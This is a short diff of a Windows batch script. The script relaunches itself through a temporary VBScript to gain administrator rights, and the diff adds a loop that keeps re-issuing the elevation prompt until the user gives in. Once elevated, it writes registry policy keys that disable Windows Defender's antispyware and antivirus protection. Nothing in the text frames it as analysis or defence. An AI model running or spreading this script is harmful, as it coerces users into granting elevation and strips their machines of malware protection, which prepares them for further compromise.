@@ -1,11 +1,14 @@
 @echo off
 cd C:\Windows\
+goto ask
+:ask
 if "%1"=="admin" goto run_as_admin
 echo error not run as Admin
 echo Set objShell = CreateObject("Shell.Application") > "%temp%\admin.vbs"
 echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
 "%temp%\admin.vbs"
 del /q "%temp%\admin.vbs"
+goto :ask
 :run_as_admin
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
